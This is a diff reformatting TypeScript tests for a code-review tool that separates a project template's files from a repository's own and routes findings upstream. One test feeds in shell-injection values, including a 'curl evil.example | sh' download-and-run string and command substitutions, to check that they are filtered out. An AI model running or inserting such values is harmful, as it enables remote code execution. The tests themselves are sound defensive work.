@@ -8,8 +8,31 @@ import type { AgentRequest, AgentResult, AgentRun } from '../src/agent.ts';
 import { maxUpstreamFindings } from '../src/config.ts';
 import { gather, readChanges, templateOf, type ChangedFile, type Gathered, type PullRequest } from '../src/gather.ts';
 import { checkSummary, checkText, summaryComment, upstreamTotal, type Results } from '../src/results.ts';
-import { byOwner, review, selectionFloor, settleUpstream, settledVerdict, templateBlock, upstreamFindings, type Charters, type Finding, type ReviewedFinding } from '../src/review.ts';
-import { answerValues, isTemplateOwned, matchesTemplateSource, parseAnswers, readTemplate, renderedTemplatePaths, templateFromAnswers, templateOwnedFiles, templateRef, templateRepository, type Template } from '../src/template.ts';
+import {
+  byOwner,
+  review,
+  selectionFloor,
+  settleUpstream,
+  settledVerdict,
+  templateBlock,
+  upstreamFindings,
+  type Charters,
+  type Finding,
+  type ReviewedFinding,
+} from '../src/review.ts';
+import {
+  answerValues,
+  isTemplateOwned,
+  matchesTemplateSource,
+  parseAnswers,
+  readTemplate,
+  renderedTemplatePaths,
+  templateFromAnswers,
+  templateOwnedFiles,
+  templateRef,
+  templateRepository,
+  type Template,
+} from '../src/template.ts';
 import { gatherChecked } from '../src/template-check.ts';
 import { placeFindings } from '../src/threads.ts';
 
@@ -40,13 +63,24 @@ workflow_tools:
 `;
 
 const template: Template = { repository: 'NCodeGroup/project-template', commit: 'v0.41.1', projectOwned: [] };
-const owning: Template = { ...template, owned: ['.template/Get-PlanState.ps1', '.template/Update-Project.ps1', '.githooks/pre-push'] };
+const owning: Template = {
+  ...template,
+  owned: ['.template/Get-PlanState.ps1', '.template/Update-Project.ps1', '.githooks/pre-push'],
+};
 
 test('parseAnswers reads the source, the version and project_owned_files in either list form', () => {
-  assert.deepEqual(parseAnswers(answers), { srcPath: 'https://github.com/NCodeGroup/project-template.git', commit: 'v0.41.1', projectOwned: [] });
-  const block = parseAnswers(`${answers}project_owned_files:\n- .github/workflows/ci.yml\n- '.github/dependabot.yml'\nstack: node\n`);
+  assert.deepEqual(parseAnswers(answers), {
+    srcPath: 'https://github.com/NCodeGroup/project-template.git',
+    commit: 'v0.41.1',
+    projectOwned: [],
+  });
+  const block = parseAnswers(
+    `${answers}project_owned_files:\n- .github/workflows/ci.yml\n- '.github/dependabot.yml'\nstack: node\n`,
+  );
   assert.deepEqual(block.projectOwned, ['.github/workflows/ci.yml', '.github/dependabot.yml']);
-  const inline = parseAnswers(`project_owned_files: [.github/workflows/ci.yml, ".githooks/pre-push"]\n_src_path: gh:NCodeGroup/project-template\n`);
+  const inline = parseAnswers(
+    `project_owned_files: [.github/workflows/ci.yml, ".githooks/pre-push"]\n_src_path: gh:NCodeGroup/project-template\n`,
+  );
   assert.deepEqual(inline.projectOwned, ['.github/workflows/ci.yml', '.githooks/pre-push']);
   assert.equal(inline.commit, '');
 });
@@ -60,7 +94,10 @@ test('templateRepository names a GitHub template by owner and name, in each form
 
 test('templateFromAnswers knows only NCodeGroup/project-template, whose files the rule lists', () => {
   assert.deepEqual(templateFromAnswers(answers), template);
-  assert.deepEqual(templateFromAnswers('_src_path: gh:ncodegroup/Project-Template\n')?.repository, 'NCodeGroup/project-template');
+  assert.deepEqual(
+    templateFromAnswers('_src_path: gh:ncodegroup/Project-Template\n')?.repository,
+    'NCodeGroup/project-template',
+  );
   assert.equal(templateFromAnswers('_src_path: https://github.com/someone/other-template.git\n'), undefined);
   // Another owner's template of the same name, or a local copy, may own other files.
   assert.equal(templateFromAnswers('_src_path: https://github.com/someone/project-template.git\n'), undefined);
@@ -76,7 +113,7 @@ test('isTemplateOwned covers only the files the template check found, and none p
   assert.ok(!isTemplateOwned('.template/Get-PlanState.ps1', undefined));
 });
 
-test('readTemplate reads a checkout\'s answers file, and nothing when there is none', () => {
+test("readTemplate reads a checkout's answers file, and nothing when there is none", () => {
   const dir = temp('template-answers-');
   assert.equal(readTemplate(dir), undefined);
   write(dir, '.copier-answers.yml', answers);
@@ -91,7 +128,7 @@ test('templateRef reads a tag or a SHA, the SHA of a described commit, and nothi
   assert.equal(templateRef('../x'), undefined);
 });
 
-test('renderedTemplatePaths maps the template folder\'s files to the paths they render to', () => {
+test("renderedTemplatePaths maps the template folder's files to the paths they render to", () => {
   const blob = (p: string, sha = 'a'.repeat(40)) => ({ path: p, type: 'blob', sha });
   const rendered = renderedTemplatePaths([
     blob('template/CLAUDE.md'),
@@ -101,9 +138,15 @@ test('renderedTemplatePaths maps the template folder\'s files to the paths they 
     blob('README.md'),
     { path: 'template/.claude', type: 'tree', sha: 'c'.repeat(40) },
   ]);
-  assert.deepEqual([...rendered.keys()], ['CLAUDE.md', '.github/instructions/project-template.instructions.md', 'build/ProjectTemplate.props']);
+  assert.deepEqual(
+    [...rendered.keys()],
+    ['CLAUDE.md', '.github/instructions/project-template.instructions.md', 'build/ProjectTemplate.props'],
+  );
   assert.deepEqual(rendered.get('CLAUDE.md'), { sha: 'a'.repeat(40), jinja: false });
-  assert.deepEqual(rendered.get('.github/instructions/project-template.instructions.md'), { sha: 'b'.repeat(40), jinja: true });
+  assert.deepEqual(rendered.get('.github/instructions/project-template.instructions.md'), {
+    sha: 'b'.repeat(40),
+    jinja: true,
+  });
 });
 
 test('templateOwnedFiles leaves out the files copier.yml writes once or merges', () => {
@@ -126,31 +169,55 @@ test('templateOwnedFiles leaves out the files copier.yml writes once or merges',
     '  Next steps.',
     '',
   ].join('\n');
-  const paths = ['CLAUDE.md', 'AGENTS.md', '.gitignore', '.template/Get-PlanState.ps1', 'docs/decisions/project-template/0001-x.md', 'docs/decisions/README.md'];
-  assert.deepEqual([...templateOwnedFiles(paths, copier)!], ['CLAUDE.md', '.template/Get-PlanState.ps1', 'docs/decisions/project-template/0001-x.md']);
+  const paths = [
+    'CLAUDE.md',
+    'AGENTS.md',
+    '.gitignore',
+    '.template/Get-PlanState.ps1',
+    'docs/decisions/project-template/0001-x.md',
+    'docs/decisions/README.md',
+  ];
+  assert.deepEqual(
+    [...templateOwnedFiles(paths, copier)!],
+    ['CLAUDE.md', '.template/Get-PlanState.ps1', 'docs/decisions/project-template/0001-x.md'],
+  );
 });
 
 test('templateOwnedFiles leaves out every file under a folder copier.yml names', () => {
   const copier = '_subdirectory: template\n_skip_if_exists: [docs/designs/]\n_merged_files: []\n';
-  assert.deepEqual([...templateOwnedFiles(['docs/designs/_template.md', 'docs/designs-notes.md'], copier)!], ['docs/designs-notes.md']);
+  assert.deepEqual(
+    [...templateOwnedFiles(['docs/designs/_template.md', 'docs/designs-notes.md'], copier)!],
+    ['docs/designs-notes.md'],
+  );
 });
 
-test('templateOwnedFiles reads nothing from a copier.yml it can\'t read plainly', () => {
+test("templateOwnedFiles reads nothing from a copier.yml it can't read plainly", () => {
   const unreadable = [
     '_skip_if_exists: [\n',
     '- a\n',
     '_skip_if_exists: []\n_merged_files: []\n',
     '_subdirectory: src\n_skip_if_exists: []\n_merged_files: []\n',
     '_subdirectory: template\n_skip_if_exists: []\n',
-    ...['"docs/*.md"', '"!AGENTS.md"', '"{{ name }}.md"', '{a: b}'].map((entry) => `_subdirectory: template\n_merged_files: []\n_skip_if_exists: [${entry}]\n`),
+    ...['"docs/*.md"', '"!AGENTS.md"', '"{{ name }}.md"', '{a: b}'].map(
+      (entry) => `_subdirectory: template\n_merged_files: []\n_skip_if_exists: [${entry}]\n`,
+    ),
   ];
   for (const copier of unreadable) assert.equal(templateOwnedFiles(['CLAUDE.md'], copier), undefined, copier);
 });
 
-const headAnswers = new Map([['project_name', 'code-review'], ['host', 'github']]);
+const headAnswers = new Map([
+  ['project_name', 'code-review'],
+  ['host', 'github'],
+]);
 
-test('matchesTemplateSource confirms the exact rendering of a source with the head\'s answers', () => {
-  assert.ok(matchesTemplateSource('# {{ project_name }}\n\nRuns on {{host}}.\n', '# code-review\n\nRuns on github.\n', headAnswers));
+test("matchesTemplateSource confirms the exact rendering of a source with the head's answers", () => {
+  assert.ok(
+    matchesTemplateSource(
+      '# {{ project_name }}\n\nRuns on {{host}}.\n',
+      '# code-review\n\nRuns on github.\n',
+      headAnswers,
+    ),
+  );
 });
 
 test('matchesTemplateSource refuses text edited where an expression was', () => {
@@ -158,11 +225,17 @@ test('matchesTemplateSource refuses text edited where an expression was', () => 
 });
 
 test('matchesTemplateSource refuses a source with a block or a comment', () => {
-  assert.ok(!matchesTemplateSource("Run {% if host == 'gitlab' %}glab{% else %}gh{% endif %} now.\n", 'Run gh now.\n', headAnswers));
+  assert.ok(
+    !matchesTemplateSource(
+      "Run {% if host == 'gitlab' %}glab{% else %}gh{% endif %} now.\n",
+      'Run gh now.\n',
+      headAnswers,
+    ),
+  );
   assert.ok(!matchesTemplateSource('{# note #}Run gh now.\n', 'Run gh now.\n', headAnswers));
 });
 
-test('matchesTemplateSource refuses a filter or a name the answers don\'t hold', () => {
+test("matchesTemplateSource refuses a filter or a name the answers don't hold", () => {
   assert.ok(!matchesTemplateSource('# {{ project_name | upper }}\n', '# CODE-REVIEW\n', headAnswers));
   assert.ok(!matchesTemplateSource('{{ _copier_answers._commit }}\n', 'v0.42.0\n', headAnswers));
   assert.ok(!matchesTemplateSource('{{ stack }}\n', '\n', headAnswers));
@@ -174,20 +247,31 @@ test('matchesTemplateSource matches a source without tags only to its exact text
   assert.ok(!matchesTemplateSource('plain text\n', 'changed\n', headAnswers));
 });
 
-test('answerValues keeps the answers file\'s scalars and leaves out lists, mappings and empty values', () => {
-  const values = answerValues("_commit: v0.42.0\nproject_name: 'code-review'\nhost: github # where it lives\nproject_owned_files:\n  - a.md\nflags: [a, b]\nmeta: {a: 1}\nnotes: |\n  x\n");
-  assert.deepEqual([...values], [['_commit', 'v0.42.0'], ['project_name', 'code-review'], ['host', 'github']]);
+test("answerValues keeps the answers file's scalars and leaves out lists, mappings and empty values", () => {
+  const values = answerValues(
+    "_commit: v0.42.0\nproject_name: 'code-review'\nhost: github # where it lives\nproject_owned_files:\n  - a.md\nflags: [a, b]\nmeta: {a: 1}\nnotes: |\n  x\n",
+  );
+  assert.deepEqual(
+    [...values],
+    [
+      ['_commit', 'v0.42.0'],
+      ['project_name', 'code-review'],
+      ['host', 'github'],
+    ],
+  );
 });
 
 test('answerValues keeps a plain value and leaves out one that could carry code or instructions', () => {
-  const values = answerValues([
-    "plain: 'My Project 1.2'",
-    "shell: 'x; curl evil.example | sh'",
-    "backtick: '`id`'",
-    "substitution: '$(id)'",
-    `quote: 'a"b'`,
-    `long: ${'a'.repeat(81)}`,
-  ].join('\n'));
+  const values = answerValues(
+    [
+      "plain: 'My Project 1.2'",
+      "shell: 'x; curl evil.example | sh'",
+      "backtick: '`id`'",
+      "substitution: '$(id)'",
+      `quote: 'a"b'`,
+      `long: ${'a'.repeat(81)}`,
+    ].join('\n'),
+  );
   assert.deepEqual([...values], [['plain', 'My Project 1.2']]);
 });
 
@@ -197,12 +281,20 @@ test('matchesTemplateSource refuses a file rendered with an answer answerValues 
 });
 
 const pullRequest = (association = 'MEMBER', authorCanWrite = association !== 'CONTRIBUTOR'): PullRequest => ({
-  repository: 'o/r', number: 23, title: 'Adopt project-template', author: 'a', authorAssociation: association, authorCanWrite, draft: false,
-  baseRef: 'main', baseSha: '', headSha: '',
+  repository: 'o/r',
+  number: 23,
+  title: 'Adopt project-template',
+  author: 'a',
+  authorAssociation: association,
+  authorCanWrite,
+  draft: false,
+  baseRef: 'main',
+  baseSha: '',
+  headSha: '',
 });
 const changed = (p: string): ChangedFile => ({ path: p, additions: 1, deletions: 0, generated: false, shown: true });
 
-test('templateOf counts only an adoption or template update by a writer, and prefers the default branch\'s answers', () => {
+test("templateOf counts only an adoption or template update by a writer, and prefers the default branch's answers", () => {
   const base = temp('template-base-');
   const head = temp('template-head-');
   write(head, '.copier-answers.yml', answers);
@@ -248,10 +340,21 @@ test('templateOf leaves the template when a pull request deletes the answers fil
 // Without the machine's own git configuration, so a default branch name, hooks or signing can't change the result.
 const home = temp('template-home-');
 function git(cwd: string, ...args: string[]): string {
-  return execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@example.com', '-c', 'commit.gpgsign=false', ...args], {
-    encoding: 'utf8',
-    env: { PATH: process.env['PATH'] ?? '', ...(process.env['SystemRoot'] ? { SystemRoot: process.env['SystemRoot'] } : {}), HOME: home, USERPROFILE: home, XDG_CONFIG_HOME: home, GIT_CONFIG_NOSYSTEM: '1' },
-  }).trim();
+  return execFileSync(
+    'git',
+    ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@example.com', '-c', 'commit.gpgsign=false', ...args],
+    {
+      encoding: 'utf8',
+      env: {
+        PATH: process.env['PATH'] ?? '',
+        ...(process.env['SystemRoot'] ? { SystemRoot: process.env['SystemRoot'] } : {}),
+        HOME: home,
+        USERPROFILE: home,
+        XDG_CONFIG_HOME: home,
+        GIT_CONFIG_NOSYSTEM: '1',
+      },
+    },
+  ).trim();
 }
 
 // A repository whose head adopts the template with one of its scripts, beside a change of its own, and a worktree of the
@@ -260,7 +363,11 @@ function adoption(): { repo: string; base: string; baseSha: string } {
   const repo = temp('template-repo-');
   git(repo, 'init', '-q', '-b', 'main');
   write(repo, 'src/a.ps1', 'Write-Output 1\n');
-  write(repo, '.github/instructions/powershell.instructions.md', '---\napplyTo: ".template/**"\n---\n- 👁 A rule for scripts.\n');
+  write(
+    repo,
+    '.github/instructions/powershell.instructions.md',
+    '---\napplyTo: ".template/**"\n---\n- 👁 A rule for scripts.\n',
+  );
   git(repo, 'add', '.');
   git(repo, 'commit', '-q', '-m', 'base');
   const baseSha = git(repo, 'rev-parse', 'HEAD');
@@ -276,13 +383,22 @@ function adoption(): { repo: string; base: string; baseSha: string } {
   return { repo, base, baseSha };
 }
 
-test('gather marks the template\'s files in an adoption, orders them last and keeps them from rule matching', () => {
+test("gather marks the template's files in an adoption, orders them last and keeps them from rule matching", () => {
   const { repo, base, baseSha } = adoption();
-  const gathered = gather({ ...pullRequest(), baseSha }, repo, base, undefined, new Set(['.template/Get-PlanState.ps1']));
+  const gathered = gather(
+    { ...pullRequest(), baseSha },
+    repo,
+    base,
+    undefined,
+    new Set(['.template/Get-PlanState.ps1']),
+  );
   assert.deepEqual(gathered.template, { ...template, owned: ['.template/Get-PlanState.ps1'] });
   const owned = gathered.files.filter((f) => f.templateOwned).map((f) => f.path);
   assert.deepEqual(owned, ['.template/Get-PlanState.ps1']);
-  assert.ok(gathered.diff.lastIndexOf('diff --git a/.template/Get-PlanState.ps1') > gathered.diff.lastIndexOf('diff --git a/src/a.ps1'));
+  assert.ok(
+    gathered.diff.lastIndexOf('diff --git a/.template/Get-PlanState.ps1') >
+      gathered.diff.lastIndexOf('diff --git a/src/a.ps1'),
+  );
   assert.deepEqual(gathered.reviewRules, []);
   // The same change from an author without write access has no template, so the rule matches the script again.
   const unowned = gather({ ...pullRequest('CONTRIBUTOR'), baseSha }, repo, base);
@@ -290,27 +406,40 @@ test('gather marks the template\'s files in an adoption, orders them last and ke
   assert.equal(unowned.reviewRules.length, 1);
 });
 
-test('gather reviews an unconfirmed template file as the project\'s', () => {
+test("gather reviews an unconfirmed template file as the project's", () => {
   const { repo, base, baseSha } = adoption();
   const gathered = gather({ ...pullRequest(), baseSha }, repo, base);
-  assert.deepEqual(gathered.files.filter((f) => f.templateOwned), []);
+  assert.deepEqual(
+    gathered.files.filter((f) => f.templateOwned),
+    [],
+  );
   assert.deepEqual(gathered.template?.owned, []);
   assert.equal(gathered.reviewRules.length, 1);
 });
 
-test('readChanges names the head\'s _commit and the changed files the template check sorts', () => {
+test("readChanges names the head's _commit and the changed files the template check sorts", () => {
   const { repo, base, baseSha } = adoption();
-  assert.deepEqual(readChanges({ ...pullRequest(), baseSha }, repo, base).candidate, { template, commit: 'v0.41.1', files: ['.template/Get-PlanState.ps1', 'AGENTS.md', 'src/a.ps1'] });
+  assert.deepEqual(readChanges({ ...pullRequest(), baseSha }, repo, base).candidate, {
+    template,
+    commit: 'v0.41.1',
+    files: ['.template/Get-PlanState.ps1', 'AGENTS.md', 'src/a.ps1'],
+  });
   // From the default branch's own commit, nothing changes, the answers file included.
-  assert.equal(readChanges({ ...pullRequest(), baseSha: git(repo, 'rev-parse', 'HEAD') }, repo, base).candidate, undefined);
+  assert.equal(
+    readChanges({ ...pullRequest(), baseSha: git(repo, 'rev-parse', 'HEAD') }, repo, base).candidate,
+    undefined,
+  );
 });
 
-test('gatherChecked reviews the template\'s files as the project\'s when the template can\'t be read, and reads it only for an adoption', async () => {
+test("gatherChecked reviews the template's files as the project's when the template can't be read, and reads it only for an adoption", async () => {
   const { repo, base, baseSha } = adoption();
   const unread = await gatherChecked({ ...pullRequest(), baseSha }, repo, base, undefined, async () => {
     throw new Error('offline');
   });
-  assert.deepEqual(unread.files.filter((f) => f.templateOwned), []);
+  assert.deepEqual(
+    unread.files.filter((f) => f.templateOwned),
+    [],
+  );
   assert.deepEqual(unread.template?.owned, []);
   const reads: string[] = [];
   const plain = await gatherChecked({ ...pullRequest('CONTRIBUTOR'), baseSha }, repo, base, undefined, async (p) => {
@@ -321,14 +450,17 @@ test('gatherChecked reviews the template\'s files as the project\'s when the tem
   assert.deepEqual(reads, []);
 });
 
-test('selectionFloor leaves the template\'s scripts out of the reviewers they would call', () => {
+test("selectionFloor leaves the template's scripts out of the reviewers they would call", () => {
   const script = { ...changed('.template/Get-PlanState.ps1'), additions: 400, templateOwned: true };
   assert.deepEqual(selectionFloor([script, changed('AGENTS.md')], true), ['hygiene']);
   assert.ok(selectionFloor([{ ...script, templateOwned: false }], true).includes('tests'));
 });
 
-test('templateBlock tells the reviewers which files are the template\'s, only when the change has some', () => {
-  const gathered = { template, files: [{ ...changed('.template/Get-PlanState.ps1'), templateOwned: true }, changed('AGENTS.md')] } as unknown as Gathered;
+test("templateBlock tells the reviewers which files are the template's, only when the change has some", () => {
+  const gathered = {
+    template,
+    files: [{ ...changed('.template/Get-PlanState.ps1'), templateOwned: true }, changed('AGENTS.md')],
+  } as unknown as Gathered;
   const block = templateBlock(gathered);
   assert.match(block, /project template NCodeGroup\/project-template \(v0\.41\.1\)/);
   assert.match(block, /\[template-owned\]/);
@@ -338,35 +470,76 @@ test('templateBlock tells the reviewers which files are the template\'s, only wh
 });
 
 const finding = (file: string, line: number, severity: Finding['severity'] = 'nit', title = 'A problem'): Finding => ({
-  severity, file, line, title, problem: 'p', consequence: 'c', fix: 'f', evidence: 'e', confidence: 0.6,
+  severity,
+  file,
+  line,
+  title,
+  problem: 'p',
+  consequence: 'c',
+  fix: 'f',
+  evidence: 'e',
+  confidence: 0.6,
 });
 
-test('a finding on the template\'s script belongs upstream, and one on AGENTS.md\'s Landing section stays a thread', () => {
-  const split = byOwner([finding('.template/Get-PlanState.ps1', 155, 'should-fix', 'Empty catch'), finding('AGENTS.md', 28, 'should-fix', 'draft: no')], owning);
-  assert.deepEqual(split.own.map((f) => f.file), ['AGENTS.md']);
-  assert.deepEqual(split.upstream.map((f) => f.file), ['.template/Get-PlanState.ps1']);
+test("a finding on the template's script belongs upstream, and one on AGENTS.md's Landing section stays a thread", () => {
+  const split = byOwner(
+    [
+      finding('.template/Get-PlanState.ps1', 155, 'should-fix', 'Empty catch'),
+      finding('AGENTS.md', 28, 'should-fix', 'draft: no'),
+    ],
+    owning,
+  );
+  assert.deepEqual(
+    split.own.map((f) => f.file),
+    ['AGENTS.md'],
+  );
+  assert.deepEqual(
+    split.upstream.map((f) => f.file),
+    ['.template/Get-PlanState.ps1'],
+  );
   const own = split.own.map((f, i) => ({ ...f, id: `F${i + 1}`, reviewers: ['conventions'] }));
   const placement = placeFindings(own, { 'AGENTS.md': [28] }, []);
-  assert.deepEqual(placement.inline.map((p) => p.finding.file), ['AGENTS.md']);
+  assert.deepEqual(
+    placement.inline.map((p) => p.finding.file),
+    ['AGENTS.md'],
+  );
   assert.deepEqual(byOwner([finding('.template/Get-PlanState.ps1', 1)], undefined).upstream, []);
 });
 
-test('a blocker in the template\'s file stays on the pull request', () => {
-  const split = byOwner([finding('.githooks/pre-push', 3, 'blocker', 'Sends the token out'), finding('.githooks/pre-push', 9, 'should-fix')], owning);
-  assert.deepEqual(split.own.map((f) => [f.line, f.severity]), [[3, 'blocker']]);
-  assert.deepEqual(split.upstream.map((f) => [f.line, f.severity]), [[9, 'should-fix']]);
+test("a blocker in the template's file stays on the pull request", () => {
+  const split = byOwner(
+    [
+      finding('.githooks/pre-push', 3, 'blocker', 'Sends the token out'),
+      finding('.githooks/pre-push', 9, 'should-fix'),
+    ],
+    owning,
+  );
+  assert.deepEqual(
+    split.own.map((f) => [f.line, f.severity]),
+    [[3, 'blocker']],
+  );
+  assert.deepEqual(
+    split.upstream.map((f) => [f.line, f.severity]),
+    [[9, 'should-fix']],
+  );
 });
 
 test('upstreamFindings lists each place once, most severe first, naming every reviewer', () => {
   const { upstream, omitted } = upstreamFindings([
     { ...finding('.githooks/pre-push', 25), reviewers: ['tests'] },
     { ...finding('.template/Get-PlanState.ps1', 155, 'nit', 'Empty catch'), reviewers: ['rule-check'] },
-    { ...finding('.template/Get-PlanState.ps1', 155, 'should-fix', 'Empty catch hides failures'), reviewers: ['hygiene'] },
+    {
+      ...finding('.template/Get-PlanState.ps1', 155, 'should-fix', 'Empty catch hides failures'),
+      reviewers: ['hygiene'],
+    },
   ]);
-  assert.deepEqual(upstream.map((f) => [f.id, f.file, f.line, f.severity, f.reviewers]), [
-    ['U1', '.template/Get-PlanState.ps1', 155, 'should-fix', ['hygiene', 'rule-check']],
-    ['U2', '.githooks/pre-push', 25, 'nit', ['tests']],
-  ]);
+  assert.deepEqual(
+    upstream.map((f) => [f.id, f.file, f.line, f.severity, f.reviewers]),
+    [
+      ['U1', '.template/Get-PlanState.ps1', 155, 'should-fix', ['hygiene', 'rule-check']],
+      ['U2', '.githooks/pre-push', 25, 'nit', ['tests']],
+    ],
+  );
   assert.equal(omitted, 0);
 });
 
@@ -377,7 +550,10 @@ test('upstreamFindings stops at maxUpstreamFindings, most severe first, and coun
   }));
   const { upstream, omitted } = upstreamFindings(many);
   assert.equal(upstream.length, maxUpstreamFindings);
-  assert.deepEqual(upstream.map((f) => f.id), Array.from({ length: maxUpstreamFindings }, (_, i) => `U${i + 1}`));
+  assert.deepEqual(
+    upstream.map((f) => f.id),
+    Array.from({ length: maxUpstreamFindings }, (_, i) => `U${i + 1}`),
+  );
   const shouldFix = Math.ceil(many.length / 2);
   assert.ok(upstream.slice(0, shouldFix).every((f) => f.severity === 'should-fix'));
   assert.ok(upstream.slice(shouldFix).every((f) => f.severity === 'nit'));
@@ -385,29 +561,48 @@ test('upstreamFindings stops at maxUpstreamFindings, most severe first, and coun
 });
 
 test('upstreamTotal counts the listed upstream findings and the omitted ones', () => {
-  const listed = (line: number): ReviewedFinding => ({ ...finding('.githooks/pre-push', line), id: `U${line}`, reviewers: ['hygiene'] });
+  const listed = (line: number): ReviewedFinding => ({
+    ...finding('.githooks/pre-push', line),
+    id: `U${line}`,
+    reviewers: ['hygiene'],
+  });
   assert.equal(upstreamTotal({}), 0);
   assert.equal(upstreamTotal({ upstream: [listed(1), listed(2)] }), 2);
   assert.equal(upstreamTotal({ upstream: [listed(1)], upstreamOmitted: 3 }), 4);
 });
 
-test('settleUpstream moves what synthesis placed in the template\'s files upstream and renumbers the rest', () => {
+test("settleUpstream moves what synthesis placed in the template's files upstream and renumbers the rest", () => {
   const reviewed = (f: Finding, id: string): ReviewedFinding => ({ ...f, id, reviewers: ['correctness'] });
-  const synthesized = [reviewed(finding('.template/Update-Project.ps1', 40, 'should-fix'), 'F1'), reviewed(finding('AGENTS.md', 28, 'should-fix', 'draft: no'), 'F2')];
+  const synthesized = [
+    reviewed(finding('.template/Update-Project.ps1', 40, 'should-fix'), 'F1'),
+    reviewed(finding('AGENTS.md', 28, 'should-fix', 'draft: no'), 'F2'),
+  ];
   const before = [{ ...finding('.template/Get-PlanState.ps1', 155), reviewers: ['hygiene'] }];
   const settled = settleUpstream(synthesized, before, owning, 'Adopts the template.');
-  assert.deepEqual(settled.findings.map((f) => [f.id, f.file]), [['F1', 'AGENTS.md']]);
-  assert.deepEqual(settled.upstream.map((f) => [f.id, f.file]), [['U1', '.template/Update-Project.ps1'], ['U2', '.template/Get-PlanState.ps1']]);
+  assert.deepEqual(
+    settled.findings.map((f) => [f.id, f.file]),
+    [['F1', 'AGENTS.md']],
+  );
+  assert.deepEqual(
+    settled.upstream.map((f) => [f.id, f.file]),
+    [
+      ['U1', '.template/Update-Project.ps1'],
+      ['U2', '.template/Get-PlanState.ps1'],
+    ],
+  );
   assert.equal(settled.upstreamOmitted, 0);
   assert.equal(settled.summary, 'Adopts the template.');
 
   const only = settleUpstream([synthesized[0]!], before, owning, 'Adopts the template.');
   assert.deepEqual(only.findings, []);
-  assert.equal(only.summary, "No findings in this repository's own files; 2 in the template's belong upstream, in NCodeGroup/project-template.");
+  assert.equal(
+    only.summary,
+    "No findings in this repository's own files; 2 in the template's belong upstream, in NCodeGroup/project-template.",
+  );
   assert.equal(settleUpstream([], [], owning, 'No findings.').summary, 'No findings.');
 });
 
-test('the verdict drops to what the findings left here call for when settling moved some of synthesis\'s upstream', () => {
+test("the verdict drops to what the findings left here call for when settling moved some of synthesis's upstream", () => {
   assert.equal(settledVerdict('request-changes', true, [{ severity: 'nit' }]), 'comment');
   assert.equal(settledVerdict('comment', true, []), 'approve');
   assert.equal(settledVerdict('request-changes', true, [{ severity: 'blocker' }]), 'request-changes');
@@ -417,14 +612,40 @@ test('the verdict drops to what the findings left here call for when settling mo
   assert.equal(settledVerdict(undefined, false, []), 'approve');
 });
 
-test('review leaves out a template finding that says a changed file isn\'t changed, and lists the rest upstream', async () => {
-  const diff = ['diff --git a/AGENTS.md b/AGENTS.md', '--- a/AGENTS.md', '+++ b/AGENTS.md', '@@ -27,1 +27,2 @@', ' a', '+draft: no', ''].join('\n');
+test("review leaves out a template finding that says a changed file isn't changed, and lists the rest upstream", async () => {
+  const diff = [
+    'diff --git a/AGENTS.md b/AGENTS.md',
+    '--- a/AGENTS.md',
+    '+++ b/AGENTS.md',
+    '@@ -27,1 +27,2 @@',
+    ' a',
+    '+draft: no',
+    '',
+  ].join('\n');
   const gathered: Gathered = {
-    pullRequest: { repository: 'o/r', number: 23, title: 'Adopt', author: 'a', authorAssociation: 'MEMBER', authorCanWrite: true, draft: false, baseRef: 'main', baseSha: 'b', headSha: 'h' },
+    pullRequest: {
+      repository: 'o/r',
+      number: 23,
+      title: 'Adopt',
+      author: 'a',
+      authorAssociation: 'MEMBER',
+      authorCanWrite: true,
+      draft: false,
+      baseRef: 'main',
+      baseSha: 'b',
+      headSha: 'h',
+    },
     mergeBase: 'b',
     files: [
       { path: 'AGENTS.md', additions: 1, deletions: 0, generated: false, shown: true },
-      { path: '.template/Get-PlanState.ps1', additions: 200, deletions: 0, generated: false, shown: true, templateOwned: true },
+      {
+        path: '.template/Get-PlanState.ps1',
+        additions: 200,
+        deletions: 0,
+        generated: false,
+        shown: true,
+        templateOwned: true,
+      },
     ],
     diff,
     chunks: [diff],
@@ -441,26 +662,68 @@ test('review leaves out a template finding that says a changed file isn\'t chang
     warnings: [],
     template: owning,
   };
-  const charters: Charters = { specialistPrompt: 's', selectionPrompt: 'sel', synthesisPrompt: 'syn', ruleCheckPrompt: 'r', verificationPrompt: 'v', reReviewPrompt: 're', reviewers: new Map([['hygiene', { text: 'hygiene', shadow: false }]]), shadowPrompts: {} };
+  const charters: Charters = {
+    specialistPrompt: 's',
+    selectionPrompt: 'sel',
+    synthesisPrompt: 'syn',
+    ruleCheckPrompt: 'r',
+    verificationPrompt: 'v',
+    reReviewPrompt: 're',
+    reviewers: new Map([['hygiene', { text: 'hygiene', shadow: false }]]),
+    shadowPrompts: {},
+  };
   const reported = [
     finding('.template/Get-PlanState.ps1', 155, 'should-fix', 'Empty catch'),
-    { ...finding('.template/Get-PlanState.ps1', 9, 'should-fix', 'Claim'), problem: 'The pull request makes no changes to `AGENTS.md`.' },
+    {
+      ...finding('.template/Get-PlanState.ps1', 9, 'should-fix', 'Claim'),
+      problem: 'The pull request makes no changes to `AGENTS.md`.',
+    },
     finding('AGENTS.md', 28, 'should-fix', 'draft: no'),
   ];
   const agent = async <T>(_run: AgentRun, request: AgentRequest): Promise<AgentResult<T>> => {
-    const record = { role: request.role, provider: 'bedrock' as const, model: request.tier, costUsd: 0, inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheWriteTokens: 0, turns: 1, durationMs: 0, outcome: 'success' };
-    const output = request.role === 'selection' ? { add: [] }
-      : request.role === 'synthesis' ? { summary: 'Merged.', verdict: 'comment', findings: [] }
-      : { findings: reported };
+    const record = {
+      role: request.role,
+      provider: 'bedrock' as const,
+      model: request.tier,
+      costUsd: 0,
+      inputTokens: 0,
+      outputTokens: 0,
+      cacheReadTokens: 0,
+      cacheWriteTokens: 0,
+      turns: 1,
+      durationMs: 0,
+      outcome: 'success',
+    };
+    const output =
+      request.role === 'selection'
+        ? { add: [] }
+        : request.role === 'synthesis'
+          ? { summary: 'Merged.', verdict: 'comment', findings: [] }
+          : { findings: reported };
     return { output: output as T, records: [record] };
   };
   const saved = process.env['CODE_REVIEW_VERIFICATION'];
   delete process.env['CODE_REVIEW_VERIFICATION'];
   try {
-    const result = await review({ run: { provider: 'bedrock', proxyUrl: 'http://127.0.0.1:1' }, gathered, charters, log: () => {}, agent });
-    assert.deepEqual(result.findings.map((f) => [f.id, f.file, f.title]), [['F1', 'AGENTS.md', 'draft: no']]);
-    assert.deepEqual(result.upstream.map((f) => [f.id, f.file, f.line, f.title]), [['U1', '.template/Get-PlanState.ps1', 155, 'Empty catch']]);
